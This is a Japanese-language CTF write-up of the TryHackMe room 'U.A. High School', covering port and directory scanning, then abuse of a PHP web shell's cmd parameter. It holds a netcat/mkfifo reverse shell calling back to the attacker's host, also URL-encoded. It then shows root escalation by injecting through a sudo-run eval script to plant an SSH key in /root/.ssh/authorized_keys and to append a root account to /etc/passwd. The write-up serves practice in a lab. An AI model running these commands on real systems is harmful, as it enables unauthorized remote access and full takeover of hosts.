# U.A. High School CTF

https://tryhackme.com/r/room/yueiua

「僕のヒーローアカデミア」の雄英高校がモチーフになっている。おもしろい。

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.228.153
root@ip-10-10-234-239:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-29 06:48 GMT
Nmap scan report for 10.10.228.153
Host is up (0.032s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:36:CE:A8:DA:47 (Unknown)

root@ip-10-10-234-239:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-29 06:49 GMT
Nmap scan report for 10.10.228.153
Host is up (0.00035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:36:CE:A8:DA:47 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

SSH と HTTP だけ。

### gobuster

```shell
root@ip-10-10-234-239:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.153
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.10.228.153/assets/]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-234-239:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.153
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.228.153/assets/]
/server-status        (Status: 403) [Size: 278]
Progress: 20473 / 20474 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-234-239:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.153
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.10.228.153/assets/]
/.php                 (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 661671 / 661674 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-234-239:~# gobuster dir -x=html -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.153
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1988]
/contact.html         (Status: 200) [Size: 2056]
/assets               (Status: 301) [Size: 315] [--> http://10.10.228.153/assets/]
/courses.html         (Status: 200) [Size: 2580]
/about.html           (Status: 200) [Size: 2542]
/.html                (Status: 403) [Size: 278]
/admissions.html      (Status: 200) [Size: 2573]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 441114 / 441116 (100.00%)
===============================================================
Finished
===============================================================

```

## contact

http://10.10.228.153/contact.html に質問ページがある。

```http
POST /contact.html HTTP/1.1
Host: 10.10.228.153
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://10.10.228.153
Connection: keep-alive
Referer: http://10.10.228.153/contact.html
Upgrade-Insecure-Requests: 1

name=bt&email=bt%40thm.com&subject=title&message=question
```

単に 200OK が返って、また質問ページが表示されるだけ。  
Action が空だから意味なさそう。

```html
<form action="#" method="POST">
  <label for="name">Name:</label>
  <input type="text" id="name" name="name" required />

  <label for="email">Email:</label>
  <input type="email" id="email" name="email" required />

  <label for="subject">Subject:</label>
  <input type="text" id="subject" name="subject" required />

  <label for="message">Message:</label>
  <textarea id="message" name="message" rows="5" required></textarea>

  <input type="submit" value="Submit" />
</form>
```

ノーアイデアなので nuclei を実行。

```shell
$ nuclei -target http://10.10.228.153

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.5

                projectdiscovery.io

[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.5 (outdated)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 8968
[WRN] Loading 198 unsigned templates for scan. Use with caution.
[INF] Executing 8770 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1693 (Reduced 1591 Requests)
[INF] Using Interactsh Server: oast.fun
[waf-detect:apachegeneric] [http] [info] http://10.10.228.153
[ssh-sha1-hmac-algo] [javascript] [info] 10.10.228.153:22
[CVE-2023-48795] [javascript] [medium] 10.10.228.153:22 ["Vulnerable to Terrapin"]
[ssh-server-enumeration] [javascript] [info] 10.10.228.153:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7"]
[ssh-password-auth] [javascript] [info] 10.10.228.153:22
[openssh-detect] [tcp] [info] 10.10.228.153:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7"]
[options-method] [http] [info] http://10.10.228.153 ["POST,OPTIONS,HEAD,GET"]
[old-copyright] [http] [info] http://10.10.228.153 ["&copy; 2023"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://10.10.228.153
[http-missing-security-headers:permissions-policy] [http] [info] http://10.10.228.153
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://10.10.228.153
[http-missing-security-headers:content-security-policy] [http] [info] http://10.10.228.153
[http-missing-security-headers:x-frame-options] [http] [info] http://10.10.228.153
[http-missing-security-headers:x-content-type-options] [http] [info] http://10.10.228.153
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://10.10.228.153
[http-missing-security-headers:referrer-policy] [http] [info] http://10.10.228.153
[http-missing-security-headers:clear-site-data] [http] [info] http://10.10.228.153
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://10.10.228.153
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://10.10.228.153
[apache-detect] [http] [info] http://10.10.228.153 ["Apache/2.4.41 (Ubuntu)"]
```

特になし。

/assets にアクセスすると、PHPSESSID が付与されるのが気になった。

```shell
root@ip-10-10-234-239:~# gobuster dir -x=txt,php -u http://$TARGET/assets/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.153/assets/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 322] [--> http://10.10.228.153/assets/images/]
/index.php            (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 278]
Progress: 661671 / 661674 (100.00%)
===============================================================
Finished
===============================================================
```

assets の下に index.php がある。空の応答で何も表示されない。

全くわからないのでウォークスルーを見た。dirsearch とかいう知らないコマンド。

```shell
$ dirsearch -u http://10.10.228.153/assets/index.php
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/CTF/reports/http_10.10.228.153/_assets_index.php_25-01-29_03-29-46.txt

Target: http://10.10.228.153/

[03:29:46] Starting: assets/index.php/
[03:29:50] 404 -  275B  - /assets/index.php/%2e%2e//google.com
[03:31:23] 200 -   40B  - /assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir

Task Completed
```

そういうことか・・・  
このツールで検出されたのはかなり奇跡的だと思う。

```http
GET /assets/index.php?cmd=whoami HTTP/1.1
Host: 10.10.228.153
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oiohn2grolgljce3phhr62kge8
Upgrade-Insecure-Requests: 1


HTTP/1.1 200 OK
Date: Wed, 29 Jan 2025 08:34:07 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 12
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

d3d3LWRhdGEK
```

```shell
rm /tmp/f; mkfifo /tmp/f; nc 10.2.22.182 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

リバースシェルを URL エンコード

```http
GET /assets/index.php?cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%20%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%20%6e%63%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%31%32%33%34%20%3c%20%2f%74%6d%70%2f%66%20%7c%20%2f%62%69%6e%2f%73%68%20%3e%2f%74%6d%70%2f%66%20%32%3e%26%31%3b%20%72%6d%20%2f%74%6d%70%2f%66%20%48%54%54%50%2f%31%2e%31 HTTP/1.1
Host: 10.10.228.153
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oiohn2grolgljce3phhr62kge8
Upgrade-Insecure-Requests: 1
```

リバースシェル取得

```shell
$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.228.153] 42358
whoami
www-data
```

```shell
ls /home
deku
ls -al /home/deku
total 36
drwxr-xr-x 5 deku deku 4096 Jul 10  2023 .
drwxr-xr-x 3 root root 4096 Jul  9  2023 ..
lrwxrwxrwx 1 root root    9 Jul  9  2023 .bash_history -> /dev/null
-rw-r--r-- 1 deku deku  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 deku deku 3771 Feb 25  2020 .bashrc
drwx------ 2 deku deku 4096 Jul  9  2023 .cache
drwxrwxr-x 3 deku deku 4096 Jul  9  2023 .local
-rw-r--r-- 1 deku deku  807 Feb 25  2020 .profile
drwx------ 2 deku deku 4096 Jul  9  2023 .ssh
-rw-r--r-- 1 deku deku    0 Jul  9  2023 .sudo_as_admin_successful
-r-------- 1 deku deku   33 Jul 10  2023 user.txt
```

デク君にならないとフラグを読めない。

deku のファイル

```shell
find / -user deku -type f 2>/dev/null
/opt/NewComponent/feedback.sh
/home/deku/.sudo_as_admin_successful
/home/deku/.profile
/home/deku/.bash_logout
/home/deku/.bashrc
/home/deku/user.txt

ls -al /opt/NewComponent/feedback.sh
-r-xr-xr-x 1 deku deku 684 Jan 23  2024 /opt/NewComponent/feedback.sh
```

/opt/NewComponent/feedback.sh

```sh
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```

eval "echo $feedback"  
の部分は怪しい気がするが、他人のユーザー入力を制御できない限り利用できる気がしない。

/var/log/feedback.txt にフィードバックを保存している。

```shell
ls -al /var/log/feedback.txt
lrwxrwxrwx 1 root root 9 Jul  9  2023 /var/log/feedback.txt -> /dev/null
```

/dev/null にリンクして捨てている。これを解除すれば保存されるはず。

```shell
unlink /var/log/feedback.txt
unlink: cannot unlink '/var/log/feedback.txt': Permission denied

ls -al /var/log
total 2732
drwxrwxr-x  11 root      syslog             4096 Jan 29 06:48 .
```

log ディレクトリに w 権限が無いので変更できなかった。

一旦離れる。

```shell
ls
images
index.php
styles.css
ls images
oneforall.jpg
yuei.jpg
```

oneforall.jpg という画像ファイルがあり、ブラウザで開こうとするとエラーで表示できなかった。

```shell
wget http://10.10.228.153/assets/images/oneforall.jpg

file ./oneforall.jpg
./oneforall.jpg: data

exiftool ./oneforall.jpg
ExifTool Version Number         : 12.76
File Name                       : oneforall.jpg
Directory                       : .
File Size                       : 98 kB
File Modification Date/Time     : 2023:07:09 12:42:05-04:00
File Access Date/Time           : 2025:01:29 04:36:43-05:00
File Inode Change Date/Time     : 2025:01:29 04:36:22-05:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Warning                         : PNG image did not start with IHDR
```

JPEG マジックナンバーの FF D8 FF E0 00 10 4A 46
49 46 00 01 に変更したら、ヒロアカのアニメ画像になった。  
https://en.wikipedia.org/wiki/List_of_file_signatures

```shell
pwd
/var/www/html/assets
ls -al ..
total 32
drwxr-xr-x 3 www-data www-data 4096 Dec 13  2023 .
drwxr-xr-x 4 www-data www-data 4096 Dec 13  2023 ..
-rw-rw-r-- 1 www-data www-data 2542 Dec 13  2023 about.html
-rw-rw-r-- 1 www-data www-data 2573 Dec 13  2023 admissions.html
drwxrwxr-x 3 www-data www-data 4096 Jan 25  2024 assets
-rw-rw-r-- 1 www-data www-data 2056 Dec 13  2023 contact.html
-rw-rw-r-- 1 www-data www-data 2580 Dec 13  2023 courses.html
-rw-rw-r-- 1 www-data www-data 1988 Dec 13  2023 index.html
ls -al ../..
total 16
drwxr-xr-x  4 www-data www-data 4096 Dec 13  2023 .
drwxr-xr-x 14 root     root     4096 Jul  9  2023 ..
drwxrwxr-x  2 www-data www-data 4096 Jul  9  2023 Hidden_Content
drwxr-xr-x  3 www-data www-data 4096 Dec 13  2023 html
ls -al ../../Hidden_Content
total 12
drwxrwxr-x 2 www-data www-data 4096 Jul  9  2023 .
drwxr-xr-x 4 www-data www-data 4096 Dec 13  2023 ..
-rw-rw-r-- 1 www-data www-data   29 Jul  9  2023 passphrase.txt
cat ../../Hidden_Content/passphrase.txt
QWxsb.....
```

Web 階層の中に、隠しディレクトリがあった。

```shell
$ echo QWxs..... | base64 -d
AllmightForEver!!!
```

deku の SSH パスワードではなかった。  
パスワードを使用してアニメ画像に steghide を適用。

```shell
$ steghide extract -sf ./oneforall.jpg
Enter passphrase:
wrote extracted data to "creds.txt".

$ cat ./creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

SSH でログインできた。

## 権限昇格

```shell
deku@myheroacademia:~$ cat user.txt
THM{W3lC0m3_D3kU_....
```

ユーザーフラグゲット。

```shell
deku@myheroacademia:~$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```

例のフィードバックシェルに sudo が付いていた。

```shell
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"
```

sudo で feedback.sh を実行し、いかにサニタイズを回避してコマンドインジェクションを実行するかということ。

1. 複数コマンドを実行する
1. root.txt 等のファイル内容を表示する

のどちらかと考えた。

1 について、HackTricks を参考にするが、全てサニタイズで封じられている。

2 についても、バッククォートや $() を使えれば cat が可能だが、できない。echo のオプションにもファイルの内容を読むのに使えそうな機能は無い。

全く分からない。ここでギブアップ。

## 答え

/root/.ssh/authorized_keys  
に、自分で作った鍵ペアの公開鍵を書き込む

```shell
# 鍵ペア生成
$ ssh-keygen -t rsa

# 公開鍵
$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdq9v/rOMli7XarXvcFBMcbTHdSCPpX388bvUXOYsT2p4wdm4pm2EpE6XVt3IFG/Y5Qrs7Y1bWcaPwGkrsTrhEOlMdQnNPmgo0eroHv7emGPQgayzwG8CHn61B8MRRe8sn8tDBDsquftGXxbiWFVMBlvGwnnttyTeOdktfJ52p0x/mEIVRfkyS7Lr8AkZtOBV0cUhHwz/kOp4Qrl2xCvtLDvc7Ricl7aYch2YOomcRjJhEmUGf57CDA0cScLR/T5cgwbsTrqtNHwX2QciMSNvBMl6ZUvhs2Miy/FmYFwVXD2RC9w7g93lRP4DlkNAySbLVjfB7XwhrwBIOMXiQoRwP8XMtU3w2xDt7kz6NvyS7U6z16QfQgNpzRo0KzbQHxBayrvoaHiMWxM2UEAGkfbbgdaSpEma33lFf8Efaqycqac9k3MZJB86H4EvVdnBwpIPRbyDqHNimBGsaYDJF6KJOetEhrN7C0pcTtFC0Md5mh8WpRySfJZvCZvGZeluBqQU= kali@kali
```

```shell
# /root/.ssh に公開鍵を書き込む
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdq9v/rOMli7XarXvcFBMcbTHdSCPpX388bvUXOYsT2p4wdm4pm2EpE6XVt3IFG/Y5Qrs7Y1bWcaPwGkrsTrhEOlMdQnNPmgo0eroHv7emGPQgayzwG8CHn61B8MRRe8sn8tDBDsquftGXxbiWFVMBlvGwnnttyTeOdktfJ52p0x/mEIVRfkyS7Lr8AkZtOBV0cUhHwz/kOp4Qrl2xCvtLDvc7Ricl7aYch2YOomcRjJhEmUGf57CDA0cScLR/T5cgwbsTrqtNHwX2QciMSNvBMl6ZUvhs2Miy/FmYFwVXD2RC9w7g93lRP4DlkNAySbLVjfB7XwhrwBIOMXiQoRwP8XMtU3w2xDt7kz6NvyS7U6z16QfQgNpzRo0KzbQHxBayrvoaHiMWxM2UEAGkfbbgdaSpEma33lFf8Efaqycqac9k3MZJB86H4EvVdnBwpIPRbyDqHNimBGsaYDJF6KJOetEhrN7C0pcTtFC0Md5mh8WpRySfJZvCZvGZeluBqQU= kali@kali > /root/.ssh/authorized_keys
It is This:
Feedback successfully saved.
```

```shell
# 秘密鍵を使って SSH接続
$ ssh root@10.10.228.153 -i id_rsa

root@myheroacademia:/opt/NewComponent# cat /root/root.txt
__   __               _               _   _                 _____ _
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/

THM{Y0U_4r3_7h3_NU....}
```

## 振り返り

- なにも返さない PHP があったら、?cmd= でインジェクションを試してみるのも手かもしれない。
- リダイレクトで任意の文字列をファイル保存できることには気づいていた。SSH 鍵に思い至らなかったのは、単純に SSH の仕組みの理解が浅かったため。
- /etc/passwd への追記も可能なため、root 権限ユーザーの追加でも対応できたのではないか？（リダイレクト可能な時点で思いつきたかったが・・・）

### root ユーザー追加の検証

```shell
# パスワードハッシュ作成
$ mkpasswd -m sha-512 hiroaka
$6$6QDfu6opuTJdoKeH$gAsKbabLgFM6VNR8bvIyvb5mcaU0v5XZx6T8tbIJvaoefxISwTCHqV8E..zKRrOgC2DLJWA83q1wYVOlf/AxT0
```

```shell
# /etc/passwd に ochako を追記
deku@myheroacademia:~$ sudo /opt/NewComponent/feedback.sh
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
'ochako:$6$6QDfu6opuTJdoKeH$gAsKbabLgFM6VNR8bvIyvb5mcaU0v5XZx6T8tbIJvaoefxISwTCHqV8E..zKRrOgC2DLJWA83q1wYVOlf/AxT0:0:0:root:/root:/bin/bash' >> /etc/passwd
It is This:
Feedback successfully saved.

# cat
deku@myheroacademia:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
deku:x:1000:1000:deku:/home/deku:/bin/bash

lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ochako:$6$6QDfu6opuTJdoKeH$gAsKbabLgFM6VNR8bvIyvb5mcaU0v5XZx6T8tbIJvaoefxISwTCHqV8E..zKRrOgC2DLJWA83q1wYVOlf/AxT0:0:0:root:/root:/bin/bash
```

```shell
# root昇格
deku@myheroacademia:~$ su - ochako
Password:
root@myheroacademia:~# cat /root/root.txt
__   __               _               _   _                 _____ _
\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___
 \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
                                  _    _
             _   _        ___    | |  | |
            | \ | | ___  /   |   | |__| | ___ _ __  ___
            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
            |_| \_|\___/|______| |_|  |_|\___|_|   \___/

THM{Y0U_4r3_7h.....
```

su で root 昇格できた！  
ただし、SSH 接続はできなかった。ホームディレクトリ等がないのが原因か？
